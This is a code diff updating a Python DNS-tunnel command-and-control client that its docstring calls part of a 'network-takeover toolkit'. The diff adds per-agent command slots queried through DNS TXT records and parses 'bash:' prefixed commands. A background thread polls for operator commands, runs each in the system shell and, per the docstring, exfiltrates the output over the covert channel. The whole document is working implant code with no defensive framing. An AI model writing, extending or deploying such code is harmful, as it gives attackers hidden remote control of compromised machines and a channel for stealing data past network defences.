@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# v1.1
+# v1.2
 """
 dns_c2.py — DNS tunnel C2 client for the network-takeover toolkit.
 
@@ -251,20 +251,30 @@ def perform_handshake(
 
 # ── Command polling ────────────────────────────────────────────────────────────
 
-def poll_command_once(domain: str, dns_server: str) -> str | None:
+def poll_command_once(domain: str, dns_server: str, agent_id: str = None) -> str | None:
     """
-    Check command.<domain> for a pending operator command.
+    Check for a pending operator command.
 
+    Checks command.<agent_id>.<domain> first (per-agent slot set by the server),
+    then falls back to command.<domain> (broadcast to all agents).
     Returns the decoded command string, or None if no command is queued.
     """
-    resp = _query_txt(f"command.{domain}", dns_server)
-    txt = _extract_txt(resp)
-    if txt is None or txt.upper() == "NONE":
-        return None
-    try:
-        return _b32dec(txt).decode("utf-8")
-    except Exception:
-        return txt
+    def _decode(txt: str) -> str | None:
+        if txt is None or txt.upper() == "NONE":
+            return None
+        try:
+            return _b32dec(txt).decode("utf-8")
+        except Exception:
+            return txt
+
+    if agent_id:
+        txt = _extract_txt(_query_txt(f"command.{agent_id}.{domain}", dns_server))
+        cmd = _decode(txt)
+        if cmd is not None:
+            return cmd
+
+    txt = _extract_txt(_query_txt(f"command.{domain}", dns_server))
+    return _decode(txt)
 
 
 def start_command_poll(
@@ -272,18 +282,28 @@ def start_command_poll(
     dns_server: str,
     interval: int = COMMAND_POLL_INTERVAL,
     execute_cb=None,
+    agent_id: str = None,
 ) -> threading.Thread:
     """
     Start a daemon thread that polls for operator commands on a fixed interval.
 
-    execute_cb(cmd: str) is called when a command arrives.  Defaults to running
-    the command in the system shell and exfiltrating the output back to C2.
+    Checks the per-agent slot (command.<agent_id>.<domain>) before the global
+    broadcast slot (command.<domain>).  execute_cb(cmd) is called on each
+    received command; defaults to running bash:<cmd> / "bash <cmd>" in the
+    system shell and exfiltrating the output.
     """
     def _default_exec(cmd: str) -> None:
-        print(f"[C2] Executing: {cmd}")
+        # Support both new "bash:<cmd>" and legacy "bash <cmd>" formats.
+        if cmd.startswith("bash:"):
+            shell_cmd = cmd[5:]
+        elif cmd.lower().startswith("bash "):
+            shell_cmd = cmd[5:]
+        else:
+            shell_cmd = cmd
+        print(f"[C2] Executing: {shell_cmd}")
         try:
             result = subprocess.run(
-                cmd, shell=True, capture_output=True, text=True, timeout=30,
+                shell_cmd, shell=True, capture_output=True, text=True, timeout=30,
             )
             output = result.stdout + result.stderr or f"[exit {result.returncode}]"
         except subprocess.TimeoutExpired:
@@ -298,7 +318,7 @@ def start_command_poll(
         while True:
             time.sleep(interval)
             try:
-                cmd = poll_command_once(domain, dns_server)
+                cmd = poll_command_once(domain, dns_server, agent_id=agent_id)
                 if cmd:
                     print(f"\n[C2!!!] Command received: {cmd}")
                     threading.Thread(target=cb, args=(cmd,), daemon=True).start()
